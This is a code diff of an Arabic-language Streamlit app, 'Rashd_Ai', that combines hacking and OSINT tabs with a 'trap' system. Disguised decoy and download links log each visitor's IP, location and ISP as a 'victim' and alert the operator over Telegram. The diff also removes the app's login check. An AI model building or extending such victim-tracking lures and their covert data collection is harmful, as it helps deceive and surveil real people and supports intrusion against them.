@@ -1,112 +1,98 @@
 import streamlit as st
+import os
+import base64
+from PIL import Image
 import requests
 import json
-import os
 from datetime import datetime
-import victim_logger
-import config
-import base64
 import uuid
 
-# إعداد متغيرات البيئة
-os.environ["TAVILY_API_KEY"] = config.get_key("TAVILY_API_KEY")
-os.environ["GROQ_API_KEY"] = config.get_key("GROQ_API_KEY")
-os.environ["GEMINI_API_KEY"] = config.get_key("GEMINI_API_KEY")
+# استيراد الإعدادات والوحدات
+import config
+import victim_logger
 
-# استيراد الوحدات
-try:
-    import domain_osint
-    import ai_pentest
-    import port_scanner
-    import network_mapper
-    import google_dork
-    import vuln_scanner
-    import darkweb_search
-    import ai_threat
-    import email_osint
-    import phone_osint
-    import website_scan
-    import username_osint
-    import geoip_osint
-    import attack_surface
-    import ai_analysis
-    import report_generator
-    from ai_hacking import AIHackingAssistant
-except ImportError as e:
-    st.warning(f"بعض المكتبات مفقودة: {e}")
+# إعداد الصفحة
+logo_path = "logo.png" # تأكد من وجود ملف اللوجو أو استبداله برابط
+if os.path.exists(logo_path):
+    logo_img = Image.open(logo_path)
+    st.set_page_config(page_title="سايبر شيلد برو", layout="wide", page_icon=logo_img)
+else:
+    st.set_page_config(page_title="سايبر شيلد برو", layout="wide", page_icon="🛡️")
 
-# إعدادات الصفحة
-st.set_page_config(page_title="Rashd_Ai - CyberShield Pro", page_icon="🛡️", layout="wide")
+# تحويل الصورة لـ base64
+def get_image_as_base64(path):
+    try:
+        with open(path, "rb") as f:
+            return base64.b64encode(f.read()).decode()
+    except: return ""
 
-# تصميم الواجهة المطابق للصورة (CSS)
+# --- CSS لتطابق التصميم المطلوب ---
 st.markdown("""
-    <style>
-    .main { background-color: #0e1117; }
-    
-    /* تنسيق العنوان الكبير كما في الصورة */
-    .main-title {
-        font-size: 60px !important;
-        font-weight: 800 !important;
-        color: white !important;
-        margin-bottom: 0px !important;
-        padding-bottom: 0px !important;
-    }
-    .sub-title {
-        font-size: 40px !important;
-        color: white !important;
-        margin-top: -20px !important;
-    }
-    
-    /* تنسيق التبويبات (Tabs) لتطابق الصورة */
-    .stTabs [data-baseweb="tab-list"] {
-        gap: 20px;
-        border-bottom: 2px solid #333;
-    }
-    .stTabs [data-baseweb="tab"] {
-        height: 60px;
-        background-color: transparent !important;
-        border: none !important;
-        color: white !important;
-        font-size: 20px !important;
-        font-weight: 600 !important;
-    }
-    .stTabs [aria-selected="true"] {
-        border-bottom: 4px solid #ff4b4b !important;
-        color: #ff4b4b !important;
-    }
-    
-    /* إخفاء واجهة Streamlit */
-    #MainMenu {visibility: hidden;}
-    footer {visibility: hidden;}
-    header {visibility: hidden;}
-    .stApp [data-testid="stToolbar"] {display: none;}
-    
-    /* تنسيق الأزرار */
-    .stButton>button {
-        width: 100%;
-        border-radius: 8px;
-        height: 3.5em;
-        background-color: #1e293b;
-        color: white;
-        border: 1px solid #334155;
-        font-weight: bold;
-    }
-    .stButton>button:hover {
-        background-color: #ff4b4b;
-        border: 1px solid #ff4b4b;
-        transform: translateY(-2px);
-        transition: 0.3s;
-    }
-    </style>
-    """, unsafe_allow_html=True)
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+
+html, body, [class*="st-"] {
+    font-family: 'Cairo', sans-serif !important;
+    direction: rtl;
+    text-align: right;
+}
+
+.main .block-container {
+    padding-top: 2rem;
+}
+
+/* تنسيق العناوين الكبيرة */
+.main-title {
+    font-size: 50px !important;
+    font-weight: 800 !important;
+    color: white !important;
+    text-align: right;
+    margin-bottom: 0px;
+}
+.sub-title {
+    font-size: 35px !important;
+    color: white !important;
+    text-align: right;
+    margin-top: -10px;
+}
+
+/* تنسيق التبويبات (Tabs) */
+.stTabs [data-baseweb="tab-list"] {
+    gap: 10px;
+    border-bottom: 2px solid #333;
+}
+.stTabs [data-baseweb="tab"] {
+    height: 50px;
+    background-color: transparent !important;
+    border: none !important;
+    color: white !important;
+    font-size: 18px !important;
+}
+.stTabs [aria-selected="true"] {
+    border-bottom: 4px solid #ff4b4b !important;
+    color: #ff4b4b !important;
+}
+
+/* أزرار خضراء كما في الكود القديم */
+.stButton>button {
+    background-color: #00ff00 !important;
+    color: black !important;
+    font-weight: bold;
+    border-radius: 8px;
+    width: 100%;
+    border: none;
+}
+
+/* إخفاء واجهة Streamlit */
+#MainMenu {visibility: hidden;}
+footer {visibility: hidden;}
+header {visibility: hidden;}
+</style>
+""", unsafe_allow_html=True)
 
 # دالة جلب الـ IP العام
 def get_real_public_ip():
     try:
-        headers = st.context.headers
-        if "X-Forwarded-For" in headers:
-            ip = headers["X-Forwarded-For"].split(",")[0].strip()
-            if not ip.startswith(("10.", "172.", "192.168.")): return ip
         return requests.get("https://api.ipify.org", timeout=5).text
     except: return "Unknown"
 
@@ -127,7 +113,7 @@ def send_telegram_alert(ip, trap_name, device="Unknown"):
         victim_logger.log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], trap_name)
     except: pass
 
-# وضع التمويه
+# وضع التمويه والتحميل
 query_params = st.query_params
 if "decoy" in query_params:
     ip = get_real_public_ip()
@@ -137,7 +123,6 @@ if "decoy" in query_params:
     with open("index.html", "r", encoding="utf-8") as f: st.components.v1.html(f.read(), height=1000)
     st.stop()
 
-# التحميل
 if "download" in query_params:
     device = query_params.get("device", "pc")
     send_telegram_alert(get_real_public_ip(), f"Download ({device})", device)
@@ -147,128 +132,43 @@ if "download" in query_params:
     st.download_button("تحميل", c, file_name=f, mime=m)
     st.stop()
 
-# تسجيل الدخول
-if "authenticated" not in st.session_state: st.session_state.authenticated = False
-if not st.session_state.authenticated:
-    st.title("🛡️ Rashd_Ai Login")
-    with st.form("login"):
-        u, p = st.text_input("User"), st.text_input("Pass", type="password")
-        if st.form_submit_button("Login"):
-            if u == config.ADMIN_USERNAME and p == config.ADMIN_PASSWORD:
-                st.session_state.authenticated = True
-                st.rerun()
-            else: st.error("Error")
-    st.stop()
-
-# القائمة الجانبية (Sidebar)
+# --- Sidebar ---
 with st.sidebar:
-    st.image("https://img.icons8.com/fluency/96/shield.png", width=80)
-    st.title("🛡️ Rashd_Ai Pro")
-    st.markdown("---")
+    if os.path.exists(logo_path):
+        img_base64 = get_image_as_base64(logo_path)
+        st.markdown(f"<div style='text-align: center;'><img src='data:image/png;base64,{img_base64}' width='120'></div>", unsafe_allow_html=True)
     
-    st.subheader("🔑 API Keys")
-    groq_key = st.text_input("Groq API Key", value=config.get_key("GROQ_API_KEY"), type="password")
-    gemini_key = st.text_input("Gemini API Key", value=config.get_key("GEMINI_API_KEY"), type="password")
-    tavily_key = st.text_input("Tavily API Key", value=config.get_key("TAVILY_API_KEY"), type="password")
+    st.header("⚙️ الإعدادات")
+    
+    groq_key = st.text_input("GROQ API", value=config.get_key("GROQ_API_KEY"), type="password")
+    gemini_key = st.text_input("GEMINI API", value=config.get_key("GEMINI_API_KEY"), type="password")
+    tavily_key = st.text_input("TAVILY API", value=config.get_key("TAVILY_API_KEY"), type="password")
     tg_token = st.text_input("Telegram Token", value=config.get_key("TELEGRAM_BOT_TOKEN"), type="password")
     tg_chat = st.text_input("Telegram Chat ID", value=config.get_key("TELEGRAM_CHAT_ID"))
     
-    if st.button("Save Keys"):
+    if st.button("حفظ الإعدادات"):
         config.set_key("GROQ_API_KEY", groq_key)
         config.set_key("GEMINI_API_KEY", gemini_key)
         config.set_key("TAVILY_API_KEY", tavily_key)
         config.set_key("TELEGRAM_BOT_TOKEN", tg_token)
         config.set_key("TELEGRAM_CHAT_ID", tg_chat)
-        st.success("Keys Saved!")
-        st.rerun()
-        
-    st.markdown("---")
-    if st.button("🚪 Logout"):
-        st.session_state.authenticated = False
+        st.success("تم الحفظ!")
         st.rerun()
 
-# الواجهة الرئيسية (مطابقة للصورة)
-st.markdown('<p class="sub-title">لوحة تحكم</p>', unsafe_allow_html=True)
-st.markdown('<p class="main-title">Rashd_Ai 🔗</p>', unsafe_allow_html=True)
+# --- العناوين الرئيسية ---
+st.markdown('<p class="sub-title">مساعد</p>', unsafe_allow_html=True)
+st.markdown('<p class="main-title">الذكي Rashd_Ai 🧠</p>', unsafe_allow_html=True)
 
-# التبويبات بأسماء وأيقونات مطابقة للصورة
+# --- التبويبات (Tabs) ---
 tabs = st.tabs([
-    "🎯 المصيدة", 
-    "📄 التقارير", 
-    "💡 الخطة", 
-    "🚨 التهديدات", 
-    "🌐 الشبكة",
-    "🧠 المساعد الذكي"
+    "🧠 المساعد الذكي", "🌐 الشبكة", "🚨 التهديدات", "💡 الخطة", "📄 التقارير",
+    "🌐 الدومين", "🔍 المواقع", "👤 المستخدم", "📍 الموقع", "🏗️ سطح الهجوم",
+    "📧 التسريبات", "📱 الهاتف", "🌑 الدارك ويب", "🔌 المنافذ", "⚠️ الثغرات", "🎯 المصيدة"
 ])
 
-# 1. المصيدة (Dashboard & Traps)
+# 1. المساعد الذكي (Chat)
 with tabs[0]:
-    victims = victim_logger.get_all_victims()
-    c1, c2, c3 = st.columns(3)
-    c1.metric("إجمالي الضحايا", len(victims))
-    c2.metric("أدوات نشطة", "18")
-    c3.metric("حالة النظام", "Online ✅")
-    
-    st.subheader("🎯 نظام المصيدة والتمويه")
-    tid = st.text_input("اسم المصيدة", value="Google_Trap")
-    st.code(f"https://rashdai.streamlit.app/?decoy=google&trap={tid}")
-    
-    st.subheader("📊 سجل الضحايا الأخير")
-    if victims: st.table(victims[:10])
-    else: st.info("لا يوجد ضحايا مسجلين بعد.")
-
-# 2. التقارير
-with tabs[1]:
-    st.header("📄 توليد التقارير الأمنية")
-    if st.button("توليد تقرير PDF شامل"):
-        try:
-            path = report_generator.generate_full_report()
-            if path:
-                with open(path, "rb") as f:
-                    st.download_button("تحميل التقرير", f, file_name="Security_Report.pdf")
-        except: st.error("الأداة غير متوفرة حالياً")
-
-# 3. الخطة
-with tabs[2]:
-    st.header("💡 خطة الاختراق والتحصين")
-    target = st.text_input("أدخل الهدف لتوليد الخطة")
-    if st.button("توليد الخطة الذكية"):
-        try: st.write(ai_pentest.generate_plan(target))
-        except: st.error("خطأ في توليد الخطة")
-
-# 4. التهديدات
-with tabs[3]:
-    st.header("🚨 تحليل التهديدات السيبرانية")
-    threat_data = st.text_area("أدخل بيانات التهديد للتحليل")
-    if st.button("بدء تحليل التهديد"):
-        try: st.write(ai_threat.analyze(threat_data))
-        except: st.error("خطأ في التحليل")
-
-# 5. الشبكة
-with tabs[4]:
-    st.header("🌐 فحص الشبكة والمنافذ")
-    net_tabs = st.tabs(["🔌 فحص منافذ", "🗺 خريطة شبكة", "⚠️ فحص ثغرات"])
-    with net_tabs[0]:
-        ip = st.text_input("IP للفحص")
-        if st.button("بدء فحص المنافذ"):
-            try: st.write(port_scanner.scan(ip))
-            except: st.error("خطأ في الفحص")
-    with net_tabs[1]:
-        ip_map = st.text_input("IP لرسم الخريطة")
-        if st.button("رسم الخريطة"):
-            try:
-                path = network_mapper.map_network(ip_map)
-                if path: st.image(path)
-            except: st.error("خطأ في الرسم")
-    with net_tabs[2]:
-        ip_vuln = st.text_input("الهدف لفحص الثغرات")
-        if st.button("فحص الثغرات"):
-            try: st.write(vuln_scanner.scan(ip_vuln))
-            except: st.error("خطأ في الفحص")
-
-# 6. المساعد الذكي (Chat)
-with tabs[5]:
-    st.header("🧠 مساعد Rashd_Ai الذكي")
+    from ai_hacking import AIHackingAssistant
     if "messages" not in st.session_state: st.session_state.messages = []
     
     with st.container(height=400):
@@ -276,7 +176,7 @@ with tabs[5]:
             with st.chat_message(msg["role"]):
                 st.markdown(msg["content"])
     
-    if prompt := st.chat_input("كيف يمكنني مساعدتك؟"):
+    if prompt := st.chat_input("اكتب رسالتك..."):
         st.session_state.messages.append({"role": "user", "content": prompt})
         with st.chat_message("user"): st.markdown(prompt)
         with st.chat_message("assistant"):
@@ -288,3 +188,57 @@ with tabs[5]:
             st.markdown(response)
         st.session_state.messages.append({"role": "assistant", "content": response})
         st.rerun()
+
+# 2. الشبكة
+with tabs[1]:
+    import network_mapper
+    t = st.text_input("الهدف لرسم الشبكة")
+    if st.button("رسم"):
+        try: st.image(network_mapper.map_network(t))
+        except: st.error("خطأ")
+
+# 3. التهديدات
+with tabs[2]:
+    import ai_threat
+    t = st.text_area("بيانات التهديد")
+    if st.button("تحليل التهديد"):
+        try: st.write(ai_threat.analyze(t))
+        except: st.error("خطأ")
+
+# 4. الخطة
+with tabs[3]:
+    import ai_pentest
+    t = st.text_input("الهدف لتوليد الخطة")
+    if st.button("توليد الخطة"):
+        try: st.write(ai_pentest.generate_plan(t))
+        except: st.error("خطأ")
+
+# 5. التقارير
+with tabs[4]:
+    import report_generator
+    if st.button("توليد تقرير شامل"):
+        try:
+            path = report_generator.generate_full_report()
+            with open(path, "rb") as f:
+                st.download_button("تحميل التقرير", f, file_name="Report.pdf")
+        except: st.error("خطأ")
+
+# بقية التبويبات (OSINT & Tools)
+with tabs[5]:
+    import domain_osint
+    d = st.text_input("الدومين")
+    if st.button("تحليل الدومين"):
+        st.write(domain_osint.whois_lookup(d))
+
+with tabs[13]:
+    import port_scanner
+    ip = st.text_input("IP للفحص")
+    if st.button("فحص المنافذ"):
+        st.write(port_scanner.scan(ip))
+
+with tabs[15]:
+    st.header("🎯 نظام المصيدة")
+    tid = st.text_input("اسم المصيدة", value="Google_Trap")
+    st.code(f"https://rashdai.streamlit.app/?decoy=google&trap={tid}")
+    if st.button("تحديث سجل الضحايا"):
+        st.table(victim_logger.get_all_victims())
